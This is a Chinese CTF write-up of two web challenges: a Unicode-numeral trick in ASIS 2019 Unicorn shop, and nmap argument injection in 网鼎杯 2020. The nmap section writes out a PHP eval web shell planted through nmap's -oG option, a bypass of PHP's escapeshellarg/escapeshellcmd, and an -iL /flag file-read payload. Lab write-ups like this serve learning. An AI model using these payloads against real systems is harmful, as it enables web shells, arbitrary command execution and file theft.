## [ASIS 2019]Unicorn shop

![image-20240508213359991](https://raw.githubusercontent.com/odiws/blog-img/main/image-20240508213359991.png)

一个一个写id，发现在写下4的时候，发现钱不够，加很多发现只能写一个字符

%E1%8D%BC  Unicode翻译后是10000，可以获得flag（钱够了），获得flag

https://xz.aliyun.com/t/5402#toc-0

https://blog.lyle.ac.cn/2018/10/29/unicode-normalization/

https://www.compart.com/en/unicode/

不是很理解unicode是怎么运行的，好像是一个字符可以unicode解码后是很多的数字比如10000.

## [网鼎杯 2020 朱雀组]Nmap 1

知识点：

利用-oG，可以将命令和结果写进文件。
利用-iL 和-oN。其中-iL是从inputfilename文件中读取扫描的目标。在这个文件中要有一个主机或者网络的列表，由空格键、制表键或者回车键作为分割符。如果使用-iL-，nmap就会从标准输入stdin读取主机名字。你可以从指定目标一节得到更加详细的信息，-oN是把扫描结果重定向到一个可读的文件logfilename中。
这道题还有escapeshellarg和escapeshellcmd函数；

### nmap 命令将扫描结果保存在文件里面：

将nmap 127.0.0.1的结果保存在test.txt里面

```bash
nmap 127.0.0.1 -oN test.txt
```

nmap其他写文件命令：

-oN (标准输出)

-oX (XML输出)

-oS (ScRipT KIdd|3 oUTpuT)

-oG (Grep输出)

-[oA](https://so.csdn.net/so/search?q=oA&spm=1001.2101.3001.7020) (输出至所有格式)

这样我们就能写shell

写指令：<?php @eval($_POST[1]); ?> -oG a.phtml

![在这里插入图片描述](https://img-blog.csdnimg.cn/e139bfb2902f45659fe0cdd3c9cb1941.png)

可能是php被过滤了，用短标签绕过，

<?= @eval($_POST[1]); ?> -oG a.phtml

发现没用，没找到文件，说明没写进去。

应为进行了escapeshellarg()与escapeshellcmd()函数处理保护，没法产生文件

可以进行单引号和空格绕过

payload：

' <?= @eval($_POST[1]);?> -oG a.phtml '

访问a.phtml 连接蚁剑  或者直接POST：1=system('ls');

当然还有更简单的写法。
`127.0.0.1' -iL /flag -oN vege.txt '`
然后直接访问即可。

' -iL /flag -oN vege.txt '
escapeshellarg()
'\'' -iL /flag -oN vege.txt '\''
''\'' -iL /flag -oN vege.txt '\'''
escapeshellcmd()
''\'' -iL /flag -oN vege.txt '\'''
''\\'' -iL /flag -oN vege.txt '\\'''
'''' -iL /flag -oN vege.txt ''''

## 